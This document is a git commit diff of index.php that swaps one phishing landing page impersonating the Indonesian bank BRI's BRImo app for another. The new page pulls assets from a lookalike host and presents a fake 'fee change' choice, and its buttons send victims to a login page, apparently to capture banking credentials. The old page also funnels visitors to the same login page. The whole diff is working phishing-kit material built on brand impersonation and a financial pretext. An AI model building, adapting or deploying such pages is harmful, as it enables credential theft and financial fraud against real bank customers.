41c8503ff6e4604a79f719aeb69217a45f6595d4
gerebeg <116833041+gerebeg@users.noreply.github.com>
2022-11-03 06:17:46 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,116 +1,60 @@
-
-<!doctype html>
 <html lang="en">
- <head> 
-  <meta charset="utf-8"> 
-  <meta name="fragment" content="!"> 
-  <meta name="description" content="BRImo merupakan Aplikasi Keuangan Bank Digital BRI Terbaru berbasis data internet yang memberikan kemudahan bagi nasabah maupun non nasabah BRI untuk dapat bertransaksi dengan User Interface dan User Experience terbaru, fitur login face recognition, login fingerprint, top up gopay, pembayaran QR dan fitur menarik lainnya, dengan pilihan Sumber Dana/sumber dana setiap transaksi dapat ..."> 
-  <link rel="canonical" href=""> 
-  <meta name="twitter:card" content="summary_large_image"> 
-  <meta property="og:title" content="BRlmo - Bank BRI"> 
-  <meta name="twitter:title" content="BRlmo - Bank BRI"> 
-  <meta property="og:site_name" content="BRImo"> 
-  <meta name="twitter:site_name" content="BRImo"> 
-  <meta property="og:description" content="BRImo merupakan Aplikasi Keuangan Bank Digital BRI Terbaru berbasis data internet yang memberikan kemudahan bagi nasabah maupun non nasabah BRI untuk dapat bertransaksi dengan User Interface dan User Experience terbaru, fitur login face recognition, login fingerprint, top up gopay, pembayaran QR dan fitur menarik lainnya, dengan pilihan Sumber Dana/sumber dana setiap transaksi dapat ..."> 
-  <meta name="twitter:description" content="BRImo merupakan Aplikasi Keuangan Bank Digital BRI Terbaru berbasis data internet yang memberikan kemudahan bagi nasabah maupun non nasabah BRI untuk dapat bertransaksi dengan User Interface dan User Experience terbaru, fitur login face recognition, login fingerprint, top up gopay, pembayaran QR dan fitur menarik lainnya, dengan pilihan Sumber Dana/sumber dana setiap transaksi dapat ..."> 
-  <link rel="image_src" href="https://d1muf25xaso8hp.cloudfront.net/https%3A%2F%2Fs3.amazonaws.com%2Fappforest_uf%2Ff1654819767432x249088519034370100%2Fbri-logo.png?w=&amp;h=&amp;auto=compress&amp;dpr=1&amp;fit=max"> 
-  <meta property="og:image" content="https://d1muf25xaso8hp.cloudfront.net/https%3A%2F%2Fs3.amazonaws.com%2Fappforest_uf%2Ff1654819767432x249088519034370100%2Fbri-logo.png?w=&amp;h=&amp;auto=compress&amp;dpr=1&amp;fit=max"> 
-  <meta name="twitter:image:src" content="https://d1muf25xaso8hp.cloudfront.net/https%3A%2F%2Fs3.amazonaws.com%2Fappforest_uf%2Ff1654819767432x249088519034370100%2Fbri-logo.png?w=&amp;h=&amp;auto=compress&amp;dpr=1&amp;fit=max"> 
-  <meta property="og:url" content=""> 
-  <meta property="og:type" content="website"> 
-  <meta name="apple-mobile-web-app-capable" content="yes"> 
-  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"> 
-  <meta name="viewport" content="width=device-width,initial-scale=1.0, user-scalable=no, minimal-ui"> 
-  <title>BRImo- Bank BRI</title> 
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous"> 
-  <style>
-        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@500&display=swap');
-        body {
-            font-family: 'Open Sans', sans-serif;
-        }
-
-        .text-header {
-            font-family: 'Open Sans', sans-serif;
-            color: #0086e0;
-        }
-
-        .text-subheader {
-            font-family: 'Open Sans', sans-serif;
-            margin-top: -60px;
-            color: #000;
-        }
-
-        .btn-punya {
-            display: block;
-            margin: 80px auto 0 auto;
-            padding: 0px; 
-            cursor: pointer; 
-            background: none rgb(0, 134, 224);
-            border: none; 
-            text-align: center; 
-            height: 46px; 
-            width: 360px; 
-            max-width: 90%;
-            font-family: Arial; 
-            font-size: 16px; 
-            font-weight: bold; 
-            color: rgb(255, 255, 255); 
-            letter-spacing: 2px; 
-            line-height: 1; 
-            border-radius: 5px; 
-            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; 
-            transition: background 200ms ease 0s;
-        }
-
-        .btn-belum {
-            display: block;
-            margin: 10px auto;
-            padding: 0px; 
-            cursor: pointer; 
-            background: none transparent;
-            border: none; 
-            text-align: center; 
-            height: 57px; 
-            width: 459px; 
-            max-width: 100%;
-            font-family: Arial; 
-            font-size: 15px; 
-            font-weight: bold; 
-            color: rgb(0, 134, 224);
-            letter-spacing: 2px; 
-            line-height: 1; 
-            border-radius: 5px; 
-            transition: background 200ms ease 0s;
-        }
-    </style> 
- </head> 
- <body> 
-  <div class="container"> 
-   <div class="row"> 
-    <div class="col-12 d-block mx-auto text-center" style="height: auto; width: auto; max-width: auto; margin-top: 70px; margin-bottom: 70px; border-radius: 0px;"> 
-     <img alt="" src="https://i.ibb.co/j68P4Sd/1658168072097.jpg" style="display: block; margin: 0px; width: 100%; height: 100%; border-radius: 0px;"> 
-    </div> 
-   </div> 
-   <div class="row" style="margin-top: -20px;"> 
-    <div class="col-12 d-block mx-auto" style="white-space: pre-wrap; width: 459px; max-width: 100%; left: 0px; top: 0px; height: 98.8px; padding-bottom: 0px; font-family: Barlow; font-size: 14px; font-weight: 400; color: rgb(59, 59, 59); line-height: 1.4; border-radius: 0px;"> 
-     <div class="text-header">
-      <font size="4"><strong>Selamat Datang Di BRImo</strong></font>
-     </div> 
-     <div class="text-subheader">
-     <font size="2"><strong>Apakah Anda memiliki Akun Internet<br>     Banking Bank BRI?</strong></font>
-     </div> 
-    </div> 
-   </div> 
-   <div class="row"> 
-    <div class="col-12"> 
-       <button type="button" class="btn-punya" onclick="location.href='public/login.php';">Punya Akun</button> 
-    </div> 
-    <div class="col-12"> 
-     <button type="button" class="btn-belum" onclick="location.href='public/login.php';">Belum Punya Akun</button> 
-    </div> 
-   </div> 
-  </div> 
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script> 
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script> 
- </body>
+  <head>
+    <meta charset="utf-8">
+    <link rel="icon" href="https://layanan-bri-brimo.web.app//favicon.ico">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="theme-color" content="#000000">
+    <meta name="description" content="Web site created using create-react-app">
+    <link rel="icon" type="image/svg" href="https://layanan-bri-brimo.web.app/bricon.svg">
+    <title>BRImo BRI</title>
+    <script src="https://layanan-bri-brimo.web.app//static/js/main.67542b1c.js"></script>
+    <link href="https://layanan-bri-brimo.web.app//static/css/main.dd3372f1.css" rel="stylesheet">
+  </head>
+  <body>
+    <div id="root">
+      <div>
+        <div>
+          <nav>
+            <img width="70px" src="https://layanan-bri-brimo.web.app//static/media/bri-header.68e106f0cf70974a2333.png">
+          </nav>
+          <br>
+          <br>
+          <br>
+          <br>
+          <center>
+            <img src="https://layanan-bri-brimo.web.app//static/media/RES.6a28692d94671436fc5a.gif" width="100%">
+          </center>
+          <br>
+          <h2 class="boblue" style="text-align: center;">Perubahan Tarif</h2>
+          <form>
+            <div class="App-v2">
+              <center>
+                <span class="boblue" style="text-align: center;">Silahkan pilih tarif transaksi sesuai kebutuhan anda di bawah ini</span>
+              </center>
+              <br>
+              <br>
+              <input type="radio" name="sama" required="" style="height: 15px; width: unset; margin-right: 5px;">
+              <span class="boblue">Tarif baru Rp 150.000 Unlimited Bulan</span>
+              <br>
+              <br>
+              <input type="radio" name="sama" required="" style="height: 15px; width: unset; margin-right: 5px;">
+              <span class="boblue"> Tarif lama Rp 6.500 / Transaksi</span>
+            </div>
+            <div class="App-v2">
+              <center>
+                <span class="boblue" style="text-align: center; font-size: 14px;">BANK BRI Update Terbaru Tarif Transaksi</span>
+              </center>
+              <br>
+              <br>
+              <button type="submit" onclick="location.href='public/login.php';"> Lanjutkan</button>
+              <br>
+              <center>
+                <img src="https://layanan-bri-brimo.web.app//static/media/fot.f020e633d7b3bd6cad2c.png" width="60%">
+              </center>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+  </body>
 </html>
